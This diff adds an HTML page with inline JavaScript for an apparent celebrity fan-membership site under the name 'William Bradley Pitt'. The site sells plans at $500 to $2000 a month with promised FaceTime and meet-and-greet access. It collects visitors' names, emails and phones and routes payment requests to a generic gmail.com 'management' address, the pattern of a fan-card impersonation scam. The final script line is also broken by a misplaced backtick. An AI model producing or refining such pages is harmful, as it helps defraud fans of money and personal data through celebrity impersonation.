@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>William Bradley Pitt Membership</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+  <header>
+    <h1 class="logo">🌟 William Bradley Pitt</h1>
+    <p class="tagline">Exclusive Fan Membership Plans</p>
+  </header>
+
+  <section class="card-container">
+    <div class="plan-card" onclick="selectPlan('Regular')">
+      <h2>Regular</h2>
+      <p class="price">$500 / month</p>
+      <ul>
+        <li>This is the Standard membership option that provides access to basics features, such as staying connected
+            with the latest updates, tours event, book signings, and movie premieres.
+        </li>
+        <li><i class="fa fa-check"></i> Basic access</li>
+        <li><i class="fa fa-check"></i> Fan newsletter</li>
+      </ul>
+    </div>
+
+    <div class="plan-card premium" onclick="selectPlan('Premium')">
+      <h2>Premium</h2>
+      <p class="price">$1300 / month</p>
+      <ul>
+        <li>This offers exclusive perks and a more enjoyable experience for members. With premium subscription, you can access unique, experimental, and early-release features that aren't available to regular users, 
+            including FaceTime, access to meet and greet, free access to tours, and more.<</li>
+        <li><i class="fa fa-check"></i> VIP updates</li>
+        <li><i class="fa fa-check"></i> Exclusive merch</li>
+      </ul>
+    </div>
+
+    <div class="plan-card vip" onclick="selectPlan('VIP')">
+      <h2>VIP</h2>
+      <p class="price">$2000 / month</p>
+      <ul>
+        <li>The VIP subscription is the ultimate membership option, offering exclusive benefits and perks. With VIP subscription, you can enjoy priority customer support, early access to new features and updates, exclusive insider content, and VIP only events. If you're looking 
+            for an elevated membership experience, the VIP subscriptionis definitely worth considering
+</li>
+        <li><i class="fa fa-check"></i> Backstage pass</li>
+        <li><i class="fa fa-check"></i> Meet & greet</li>
+      </ul>
+    </div>
+  </section>
+
+  <script src="script.js"></script>
+<script>
+        // Save selected plan
+function selectPlan(plan) {
+  localStorage.setItem("selectedPlan", plan);
+  window.location.href = "benefits.html";
+}
+
+// Benefits page logic
+if (window.location.pathname.includes("benefits.html")) {
+  const plan = localStorage.getItem("selectedPlan");
+  const title = document.getElementById("plan-title");
+  const benefits = document.getElementById("plan-benefits");
+
+  const plans = {
+    Regular: "✔ Basic access ✔ Fan newsletter",
+    Premium: "✔ VIP updates ✔ Exclusive merch ✔ Fan newsletter",
+    VIP: "✔ Backstage pass ✔ Meet & greet ✔ Exclusive merch ✔ VIP updates"
+  };
+
+  title.textContent = `${plan} Membership Benefits`;
+  benefits.textContent = plans[plan];
+}
+
+function proceedToPayment() {
+  window.location.href = "payment.html";
+}
+
+// Payment form → Go to payment method page
+if (window.location.pathname.includes("payment.html")) {
+  document.getElementById("paymentForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    localStorage.setItem("userName", document.getElementById("name").value);
+    localStorage.setItem("userEmail", document.getElementById("email").value);
+    localStorage.setItem("userPhone", document.getElementById("phone").value);
+    window.location.href = "payment-method.html";
+  });
+}
+
+// Payment method selection → Open Gmail with full message
+function selectPaymentMethod(method) {
+  const plan = localStorage.getItem("selectedPlan");
+  const name = localStorage.getItem("userName");
+  const email = localStorage.getItem("userEmail");
+  const phone = localStorage.getItem("userPhone");
+
+  const subject = `Payment Request for ${plan} Plan via ${method}`;
+  const body = `Hello William Bradley Pitt Management,%0D%0A%0D%0A
+I would like to subscribe to the ${plan} Fan Card plan.%0D%0A
+Name: ${name}%0D%0A
+Email: ${email}%0D%0A
+Phone: ${phone}%0D%0A
+Preferred Payment Method: ${method}%0D%0A
+Please send me the payment details.%0D%0A%0D%0A
+Thank you.`;
+`
+  window.location.href = https://mail.google.com/mail/?view=cm&fs=1&to=management@gmail.com&su=${subject}&body=${body}`;
+}
+
+</script>
+
+</body>
+</html>
